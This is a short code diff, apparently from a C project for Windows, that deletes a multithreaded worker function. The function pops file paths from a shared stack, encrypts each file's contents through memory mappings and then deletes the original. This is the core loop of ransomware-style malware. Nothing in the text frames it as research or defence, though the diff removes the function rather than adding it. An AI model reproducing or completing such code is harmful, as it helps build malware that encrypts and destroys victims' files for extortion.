@@ -51,20 +51,3 @@ void encrypt_data(LPCVOID p_src, LPVOID p_dest, DWORD file_size) {
         }
     }
 }
-
-DWORD WINAPI pop_and_encrypt(LPVOID param) {
-    struct Stack *stack = (struct Stack*)param;
-    while(true) {    
-        sync_wait_semaphore();
-        sync_lock_mutex();
-        wchar_t *file_path = (wchar_t*)stack_pop(stack);
-        sync_unlock_mutex();
-        LPVOID p_src, p_dst;
-        DWORD file_size;
-        fu_create_file_mappings(file_path, &file_size, &p_src, &p_dst);
-        encrypt_data(p_src, p_dst, file_size);
-        DeleteFileW(file_path);
-        free(file_path);
-    }
-    return 0;
-}
